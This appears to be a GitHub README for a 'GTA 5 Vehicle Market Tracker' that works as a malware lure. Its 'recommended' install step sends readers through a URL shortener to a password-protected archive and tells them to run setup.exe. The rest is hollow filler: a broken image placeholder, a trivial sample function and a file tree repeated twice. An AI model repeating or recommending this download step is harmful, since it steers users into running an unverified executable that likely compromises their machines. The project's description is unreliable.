# GTA-5-Vehicle-Market-Tracker
## Description
GTA 5 Vehicle Market Tracker is a tool for tracking prices and availability of vehicles in the GTA 5 game.
![Uploading image.png…]()

## Installation

📥 Installation & Run

🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ [Download](https://goo.su/eVFVDu) and extract archive(pass: Project12!)

2️⃣ Run setup.exe
🚀 The application will set up everything automatically, just enjoy!

⚠️ Important: This method is faster and requires no manual setup!



❌ COMPLEX METHOD (For Developers Only)
1. Clone the repository:
git clone https://github.com/pammellale/GTA-5-Vehicle-Market-Tracker.git

2. Install the necessary libraries:
pip install -r requirements.txt

## Usage
Run the script to start tracking:
python main.py

## Features
- Track current vehicle prices
- Notify when prices drop
- Save price history

## Sample code
import requests

def get_vehicle_data(vehicle_name):
response = requests.get(f'http://example.com/vehicles/{vehicle_name}')
return response.json()

## Contributions
Please see the CONTRIBUTING.md file for information on how to contribute.

## License
This project is licensed under the MIT License - see the LICENSE file for details.

---

### File Structure
│
├── README.md
├── LICENSE
├── requirements.txt
├── main.py
├── vehicle_tracker.py
└── CONTRIBUTING.md
├── LICENSE
├── requirements.txt
├── main.py
├── vehicle_tracker.py
└── CONTRIBUTING.md
